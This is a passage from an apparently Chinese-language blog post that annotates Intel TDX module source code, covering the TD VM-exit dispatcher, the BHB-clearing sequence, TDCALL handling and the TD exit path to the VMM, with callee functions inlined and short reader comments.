entry</span><br><span class=\"line\">    movq %gs:TDX_LOCAL_DATA_CURRENT_TD_VM_ID_OFFSET, %rax</span><br><span class=\"line\">    test %rax, %rax</span><br><span class=\"line\">    jnz l2_dispatcher</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Call the VMM API dispatcher</span><br><span class=\"line\">     */</span><br><span class=\"line\">    callq tdx_td_dispatcher</span><br><span class=\"line\">     </span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Unreachable code.  panic. </span><br><span class=\"line\">     */</span><br><span class=\"line\">    ud2</span><br><span class=\"line\"></span><br><span class=\"line\">l2_dispatcher:</span><br><span class=\"line\"></span><br><span class=\"line\">    callq tdx_td_l2_dispatcher</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Unreachable code.  panic.</span><br><span class=\"line\">     */</span><br><span class=\"line\">    ud2</span><br></pre></td></tr></table></figure>\n\n<p>gs 寄存器往后偏移的数据作为 local_data 的基地址</p>\n<p>local_data_fast_ref_ptr 存的就是 local_data 的地址</p>\n<p>这样做默认了 gs base 就是 local_data 为什么不直接读？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">tdx_td_dispatcher</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">tdx_module_local_t</span>* tdx_local_data_ptr = get_local_data();</span><br><span class=\"line\">            _STATIC_INLINE_ <span class=\"type\">tdx_module_local_t</span>* <span class=\"title function_\">get_local_data</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"type\">uint64_t</span> local_data_addr;</span><br><span class=\"line\">            </span><br><span class=\"line\">                _ASM_ (<span class=\"string\">&quot;movq %%gs:%c[local_data], %0\\n\\t&quot;</span></span><br><span class=\"line\">                         :<span class=\"string\">&quot;=r&quot;</span>(local_data_addr)</span><br><span class=\"line\">                         :[local_data]<span class=\"string\">&quot;i&quot;</span>(offsetof(<span class=\"type\">tdx_module_local_t</span>, local_data_fast_ref_ptr)));</span><br><span class=\"line\">            </span><br><span class=\"line\">                <span class=\"keyword\">return</span> (<span class=\"type\">tdx_module_local_t</span>*)local_data_addr;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">vm_vmexit_exit_reason_t</span> vm_exit_reason;</span><br><span class=\"line\">    <span class=\"type\">vmx_exit_qualification_t</span> vm_exit_qualification;</span><br><span class=\"line\">    <span class=\"type\">vmx_exit_inter_info_t</span> vm_exit_inter_info;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">vmx_guest_inter_state_t</span> guest_inter_state;</span><br><span class=\"line\">    <span class=\"type\">vmx_procbased_ctls_t</span> vm_procbased_ctls;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">td_param_attributes_t</span> attr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">bool_t</span> interrupt_occurred = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> vm_id = tdx_local_data_ptr-&gt;vp_ctx.tdvps-&gt;management.curr_vm;</span><br><span class=\"line\"></span><br><span class=\"line\">    tdx_sanity_check((vm_id == tdx_local_data_ptr-&gt;current_td_vm_id) &amp;&amp; (vm_id == <span class=\"number\">0</span>),</span><br><span class=\"line\">                     SCEC_TD_DISPATCHER_SOURCE, <span class=\"number\">35</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    stepping_filter_e vmexit_stepping_result;</span><br><span class=\"line\">    vmexit_stepping_result = tdx_td_l1_l2_dispatcher_common_prologue(tdx_local_data_ptr, <span class=\"number\">0</span>, &amp;vm_exit_reason,</span><br><span class=\"line\">                                    &amp;vm_exit_qualification, &amp;vm_exit_inter_info);</span><br><span class=\"line\"></span><br><span class=\"line\">                stepping_filter_e <span class=\"title function_\">tdx_td_l1_l2_dispatcher_common_prologue</span><span class=\"params\">(<span class=\"type\">tdx_module_local_t</span>* local_data, <span class=\"type\">uint16_t</span> vm_id,</span></span><br><span class=\"line\"><span class=\"params\">                            <span class=\"type\">vm_vmexit_exit_reason_t</span>* vm_exit_reason, <span class=\"type\">vmx_exit_qualification_t</span>* vm_exit_qualification,</span></span><br><span class=\"line\"><span class=\"params\">                            <span class=\"type\">vmx_exit_inter_info_t</span>* vm_exit_inter_info)</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"type\">tdx_module_global_t</span>* tdx_global_data_ptr = get_global_data();</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        TDX_LOG(<span class=\"string\">&quot;TD Dispatcher Entry from VM %d\\n&quot;</span>, vm_id);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Execute the BHB defense sequence</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (tdx_global_data_ptr-&gt;rtm_supported)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            tsx_abort_sequence();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">else</span></span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"comment\">// BHB draining sequence</span></span><br><span class=\"line\">                            <span class=\"comment\">// There are 6 taken branches in each iteration (one CALL, four JMPs, and one JNZ),</span></span><br><span class=\"line\">                            <span class=\"comment\">// so for GLC (194 branch stews in BHB), NUM_ITERS = round-up(194 / 6) = 32.</span></span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> num_iters = NUM_OF_BHB_CLEARING_ITERATIONS;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> num_iters_multi_8 = <span class=\"number\">8</span>*num_iters;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                            _ASM_VOLATILE_ (</span><br><span class=\"line\">                                <span class=\"string\">&quot;movq %0, %%rcx\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;1:  call 2f\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;lfence\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;2:  jmp 3f\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;nop\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;3:  jmp 4f\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;nop\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;4:  jmp 5f\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;nop\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;5:  jmp 6f\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;nop\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;6:  dec %%rcx\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;jnz 1b\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;add %1, %%rsp\\n&quot;</span></span><br><span class=\"line\">                                <span class=\"string\">&quot;lfence\\n&quot;</span></span><br><span class=\"line\">                                : : <span class=\"string\">&quot;a&quot;</span>(num_iters), <span class=\"string\">&quot;b&quot;</span>(num_iters_multi_8) : <span class=\"string\">&quot;memory&quot;</span>, <span class=\"string\">&quot;rcx&quot;</span>);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Save current time to verify on next TD entry and for TDEXIT filter checks</span></span><br><span class=\"line\">                        local_data-&gt;vp_ctx.tdvps-&gt;management.last_exit_tsc = ia32_rdtsc();</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Save TD GPR state to TDVPS.</span></span><br><span class=\"line\">                        <span class=\"comment\">// DR&#x27;s, XSTATE and XCR&#x27;s, MSR&#x27;s will be saved if exit to TD will be required later</span></span><br><span class=\"line\">                        <span class=\"comment\">// In case of need of performance improvement - should be done only when actual vmexit to VMM happens</span></span><br><span class=\"line\">                        save_guest_td_gpr_state_on_td_vmexit();</span><br><span class=\"line\">                            <span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">save_guest_td_gpr_state_on_td_vmexit</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"type\">tdx_module_local_t</span>* local_data_ptr = get_local_data();</span><br><span class=\"line\">                                <span class=\"type\">tdvps_t</span>* tdvps_ptr = local_data_ptr-&gt;vp_ctx.tdvps;</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                <span class=\"comment\">// GPR&#x27;s saving: move them from local data area (already saved there by assembly prologue) to current TDVPS</span></span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rax = local_data_ptr-&gt;td_regs.rax;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rcx = local_data_ptr-&gt;td_regs.rcx;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rdx = local_data_ptr-&gt;td_regs.rdx;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rbx = local_data_ptr-&gt;td_regs.rbx;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rbp = local_data_ptr-&gt;td_regs.rbp;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rsi = local_data_ptr-&gt;td_regs.rsi;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.rdi = local_data_ptr-&gt;td_regs.rdi;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r8  = local_data_ptr-&gt;td_regs.r8;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r9  = local_data_ptr-&gt;td_regs.r9;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r10 = local_data_ptr-&gt;td_regs.r10;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r11 = local_data_ptr-&gt;td_regs.r11;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r12 = local_data_ptr-&gt;td_regs.r12;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r13 = local_data_ptr-&gt;td_regs.r13;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r14 = local_data_ptr-&gt;td_regs.r14;</span><br><span class=\"line\">                                tdvps_ptr-&gt;guest_state.gpr_state.r15 = local_data_ptr-&gt;td_regs.r15;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        local_data-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_spec_ctrl = ia32_rdmsr(IA32_SPEC_CTRL_MSR_ADDR);</span><br><span class=\"line\">                        wrmsr_opt(IA32_SPEC_CTRL_MSR_ADDR, TDX_MODULE_IA32_SPEC_CTRL,</span><br><span class=\"line\">                                local_data-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_spec_ctrl);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Clear NMI unblocking flag;</span></span><br><span class=\"line\">                        <span class=\"comment\">// For L1 this is used only for L2 VM entries following L2 VM exits</span></span><br><span class=\"line\">                        <span class=\"comment\">// For L2 it will be set later if required, and using on L2 VM entry</span></span><br><span class=\"line\">                        local_data-&gt;vp_ctx.tdvps-&gt;management.nmi_unblocking_due_to_iret = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Get exit information</span></span><br><span class=\"line\">                        ia32_vmread(VMX_VM_EXIT_REASON_ENCODE, &amp;vm_exit_reason-&gt;raw);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (vm_exit_reason-&gt;vmenter_fail == <span class=\"number\">0</span>)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"comment\">// If no failed VMENTRY occurred then the VMCS is launched after a VMEXIT</span></span><br><span class=\"line\">                            local_data-&gt;vp_ctx.tdvps-&gt;management.vm_launched[vm_id] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        ia32_vmread(VMX_VM_EXIT_QUALIFICATION_ENCODE, &amp;vm_exit_qualification-&gt;raw);</span><br><span class=\"line\">                        ia32_vmread(VMX_VM_EXIT_INTERRUPTION_INFO_ENCODE, &amp;vm_exit_inter_info-&gt;raw);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (local_data-&gt;vp_ctx.tdr-&gt;management_fields.fatal)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"comment\">// A #MC VM exit has occurred on another LP, indicating memory integrity error.</span></span><br><span class=\"line\">                            <span class=\"comment\">// Do an async TD exit without accessing TD memory.</span></span><br><span class=\"line\">                            async_tdexit_to_vmm(TDX_NON_RECOVERABLE_TD_NON_ACCESSIBLE, *vm_exit_reason,</span><br><span class=\"line\">                                                           vm_exit_qualification-&gt;raw, <span class=\"number\">0</span>, <span class=\"number\">0</span>, vm_exit_inter_info-&gt;raw);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// If a preempted bus lock has been reported in the exit reason, set the local data bus lock flag.</span></span><br><span class=\"line\">                        <span class=\"comment\">// This flag is sticky bit; it gets reset only when reported on TD exit.</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (vm_exit_reason-&gt;bus_lock_preempted)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            local_data-&gt;vp_ctx.bus_lock_preempted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// If the TD is debuggable, the host VMM can request all L2 exits to be converted to TD exits.</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((vm_id &gt; <span class=\"number\">0</span>) &amp;&amp; local_data-&gt;vp_ctx.tdvps-&gt;management.l2_debug_ctls[vm_id].td_exit_on_l2_vm_exit)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            tdx_debug_assert(local_data-&gt;vp_ctx.tdcs-&gt;executions_ctl_fields.attributes.debug == <span class=\"number\">1</span>);</span><br><span class=\"line\">                            async_tdexit_to_vmm(TDX_TD_EXIT_ON_L2_VM_EXIT, *vm_exit_reason, vm_exit_qualification-&gt;raw, <span class=\"number\">0</span>, <span class=\"number\">0</span>, vm_exit_inter_info-&gt;raw);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"keyword\">return</span> vmexit_stepping_result;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vmexit_stepping_result != FILTER_OK_CONTINUE)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handle_vm_entry_failures(tdx_local_data_ptr, vm_exit_reason, vm_exit_qualification);</span><br><span class=\"line\"></span><br><span class=\"line\">    attr = tdx_local_data_ptr-&gt;vp_ctx.tdcs-&gt;executions_ctl_fields.attributes;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (vm_exit_reason.basic_reason)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> VMEXIT_REASON_VMFUNC_INSTRUCTION:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> VMEXIT_REASON_ENCLS_INSTRUCTION:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> VMEXIT_REASON_ENCLV_INSTRUCTION:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> VMEXIT_REASON_ENQCMDS_PASID_TRANSLATION_FAILURE:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> VMEXIT_REASON_SEAMCALL:</span><br><span class=\"line\">            inject_ud();</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> VMEXIT_REASON_TDCALL:</span><br><span class=\"line\">            td_call(tdx_local_data_ptr, &amp;interrupt_occurred);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">td_call</span><span class=\"params\">(<span class=\"type\">tdx_module_local_t</span>* tdx_local_data_ptr, <span class=\"type\">bool_t</span>* interrupt_occurred)</span></span><br><span class=\"line\">    <span class=\"title function_\">if</span> <span class=\"params\">(!is_td_guest_in_64b_mode())</span><span class=\"keyword\">return</span>;</span><br><span class=\"line\">     leaf_opcode.raw = tdx_local_data_ptr-&gt;td_regs.rax;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ((leaf_opcode.reserved0 != <span class=\"number\">0</span>) || (leaf_opcode.reserved1 != <span class=\"number\">0</span>)) <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((leaf_opcode.version &gt; <span class=\"number\">0</span>) &amp;&amp;</span><br><span class=\"line\">        (leaf_opcode.leaf != TDG_VM_RD_LEAF))<span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (leaf_opcode.leaf)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> TDG_VP_VMCALL_LEAF:</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">//Special case.  will (or may) not return to the TD but to go to VMM.</span></span><br><span class=\"line\">                retval = tdg_vp_vmcall(tdx_local_data_ptr-&gt;td_regs.rcx);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">      EXIT:</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">api_error_type <span class=\"title function_\">tdg_vp_vmcall</span><span class=\"params\">(<span class=\"type\">uint64_t</span> controller_value)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    api_error_type retval = TDX_OPERAND_INVALID;</span><br><span class=\"line\">    <span class=\"type\">tdx_module_local_t</span>* tdx_local_data_ptr = get_local_data();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">tdvmcall_control_t</span> control = &#123; .raw = controller_value &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> gpr_check_mask = (<span class=\"type\">uint16_t</span>)(BIT(<span class=\"number\">0</span>) | BIT(<span class=\"number\">1</span>) | BIT(<span class=\"number\">4</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdx_local_data_ptr-&gt;vp_ctx.tdcs-&gt;executions_ctl_fields.config_flags.no_rbp_mod)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        gpr_check_mask |= (<span class=\"type\">uint16_t</span>)BIT(<span class=\"number\">5</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Bits 0, 1 and 4 and 63:32 of RCX must be 0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (((control.gpr_select &amp; gpr_check_mask) != <span class=\"number\">0</span>) ||</span><br><span class=\"line\">         (control.reserved != <span class=\"number\">0</span>))<span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// TDX-SEAM loads the host VMM GPRs (in its LP-scope state save area), except RAX,</span></span><br><span class=\"line\">    <span class=\"comment\">// with the guest TD GPR (from TDVPS).</span></span><br><span class=\"line\">    copy_gprs_data_from_td_to_vmm(tdx_local_data_ptr, control);</span><br><span class=\"line\">            <span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">copy_gprs_data_from_td_to_vmm</span><span class=\"params\">(<span class=\"type\">tdx_module_local_t</span>* tdx_local_data_ptr,</span></span><br><span class=\"line\"><span class=\"params\">                                                      <span class=\"type\">tdvmcall_control_t</span> control)</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Copy guest TD&#x27;s GPRs, selected by the input parameter, to the host VMM GPRs image.</span></span><br><span class=\"line\">                <span class=\"comment\">// Clear other non-selected GPRs.</span></span><br><span class=\"line\">                <span class=\"type\">td_exit_qualification_t</span> td_exit_qual = &#123; .raw = <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">                td_exit_qual.vm = tdx_local_data_ptr-&gt;vp_ctx.tdvps-&gt;management.curr_vm;</span><br><span class=\"line\">                td_exit_qual.gpr_select = control.gpr_select;</span><br><span class=\"line\">                td_exit_qual.xmm_select = control.xmm_select;</span><br><span class=\"line\">            </span><br><span class=\"line\">                tdx_local_data_ptr-&gt;vmm_regs.rcx = td_exit_qual.raw;</span><br><span class=\"line\">            </span><br><span class=\"line\">                <span class=\"comment\">// RAX is not copied, RCX filled above, start from RDX</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">uint32_t</span> i = <span class=\"number\">2</span>; i &lt; <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((control.gpr_select &amp; BIT(i)) != <span class=\"number\">0</span>)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        tdx_local_data_ptr-&gt;vmm_regs.gprs[i] = tdx_local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_state.gpr_state.gprs[i];</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">else</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// Avoid modifying RBP</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (!tdx_local_data_ptr-&gt;vp_ctx.tdcs-&gt;executions_ctl_fields.config_flags.no_rbp_mod ||</span><br><span class=\"line\">                                (i != <span class=\"number\">5</span>))</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            tdx_local_data_ptr-&gt;vmm_regs.gprs[i] = <span class=\"number\">0ULL</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set the exit reason in RAX</span></span><br><span class=\"line\">    <span class=\"comment\">// Check the sticky BUS_LOCK_PREEMPTED flag, report and clear if true.</span></span><br><span class=\"line\">    <span class=\"type\">vm_vmexit_exit_reason_t</span> vm_exit_reason = &#123; .raw = VMEXIT_REASON_TDCALL&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdx_local_data_ptr-&gt;vp_ctx.bus_lock_preempted)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        vm_exit_reason.bus_lock_preempted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        tdx_local_data_ptr-&gt;vp_ctx.bus_lock_preempted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    tdx_local_data_ptr-&gt;vmm_regs.rax = vm_exit_reason.raw;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">ia32_xcr0_t</span> xcr0 = &#123; .raw = tdx_local_data_ptr-&gt;vp_ctx.xfam &#125;;</span><br><span class=\"line\">    xcr0.sse = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> scrub_mask = xcr0.raw;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// TDGVPVMCALL behaves as a trap-like TD exit.</span></span><br><span class=\"line\">    <span class=\"comment\">// TDX-SEAM advances the guest TD RIP (in TD VMCS) to the instruction following TDCALL.</span></span><br><span class=\"line\">    td_vmexit_to_vmm(VCPU_READY, LAST_EXIT_TDVMCALL, scrub_mask, control.xmm_select, <span class=\"literal\">false</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    EXIT_FAILURE:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retval;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">td_vmexit_to_vmm</span><span class=\"params\">(<span class=\"type\">uint8_t</span> vcpu_state, <span class=\"type\">uint8_t</span> last_td_exit, <span class=\"type\">uint64_t</span> scrub_mask,</span></span><br><span class=\"line\"><span class=\"params\">                      <span class=\"type\">uint16_t</span> xmm_select, <span class=\"type\">bool_t</span> is_td_dead, <span class=\"type\">bool_t</span> is_trap_exit)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Local data</span></span><br><span class=\"line\">    <span class=\"type\">tdx_module_local_t</span>* tdx_local_data_ptr = get_local_data();</span><br><span class=\"line\">    <span class=\"type\">vp_ctx_t</span>* vp_ctx = &amp;tdx_local_data_ptr-&gt;vp_ctx;</span><br><span class=\"line\">    <span class=\"type\">tdvps_t</span>* tdvps_ptr = tdx_local_data_ptr-&gt;vp_ctx.tdvps;</span><br><span class=\"line\">    <span class=\"type\">tdcs_t</span>* tdcs_ptr = tdx_local_data_ptr-&gt;vp_ctx.tdcs;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Avoid accessing TD private memory and control structures (except TDR).</span></span><br><span class=\"line\">    <span class=\"comment\">// The TD is dead, no need so save its state.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!is_td_dead)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1.  Save any guest state that it has not saved as part of the common guest-side operation, e.g.,</span></span><br><span class=\"line\">        <span class=\"comment\">//     the extended state per TDCS.XFAM</span></span><br><span class=\"line\">        save_guest_td_state_before_td_exit(tdcs_ptr, tdx_local_data_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 2.  Set TDVPS.STATE to one of the VCPU_READY sub states, as an indication to the next TD entry.</span></span><br><span class=\"line\">        tdvps_ptr-&gt;management.state = vcpu_state;</span><br><span class=\"line\">        tdvps_ptr-&gt;management.last_td_exit = last_td_exit;</span><br><span class=\"line\">        <span class=\"comment\">// At this point the VCPU state will no longer be accessed</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((tdvps_ptr-&gt;management.curr_vm != <span class=\"number\">0</span>) &amp;&amp; !is_trap_exit)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// On TD exit from L2 VM, write the output memory operands of TDG.VP.ENTER to memory.</span></span><br><span class=\"line\">            <span class=\"comment\">// This is done at this point, before the TLB tracking counter is decremented,</span></span><br><span class=\"line\">            <span class=\"comment\">// because after that the memory is not protected by TLB tracking and may not</span></span><br><span class=\"line\">            <span class=\"comment\">// be valid for writing anymore.</span></span><br><span class=\"line\">            write_l2_enter_outputs(tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Save Guest-TD XCR0 and XSS</span></span><br><span class=\"line\">        save_guest_td_extended_state(tdvps_ptr, tdx_local_data_ptr-&gt;vp_ctx.xfam);</span><br><span class=\"line\">            _STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">save_guest_td_extended_state</span><span class=\"params\">(<span class=\"type\">tdvps_t</span>* tdvps_ptr, <span class=\"type\">uint64_t</span> xfam)</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Set Guest XCR0 and XSS context for saving the state</span></span><br><span class=\"line\">                ia32_xsetbv(<span class=\"number\">0</span>, xfam &amp; XCR0_USER_BIT_MASK);</span><br><span class=\"line\">                ia32_wrmsr(IA32_XSS_MSR_ADDR, xfam &amp; XCR0_SUPERVISOR_BIT_MASK);</span><br><span class=\"line\">            </span><br><span class=\"line\">                ia32_xsaves(&amp;tdvps_ptr-&gt;guest_extension_state.xbuf, xfam);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (is_trap_exit)<span class=\"comment\">//true</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// TDGVPVMCALL behaves as a trap-like TD exit.</span></span><br><span class=\"line\">            <span class=\"comment\">// TDX-SEAM advances the guest TD RIP (in TD VMCS) to the instruction following TDCALL.</span></span><br><span class=\"line\">            advance_guest_rip();</span><br><span class=\"line\">                <span class=\"type\">void</span> <span class=\"title function_\">advance_guest_rip</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    current_vmcs_guest_rip_advance(<span class=\"number\">0</span>);</span><br><span class=\"line\">                </span><br><span class=\"line\">                    clear_movss_sti_blocking();</span><br><span class=\"line\">                    set_guest_pde_bs();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 3.  Execute the TD exit TLB tracking sequence, adjusting the TDCS tracking counters.</span></span><br><span class=\"line\">        <span 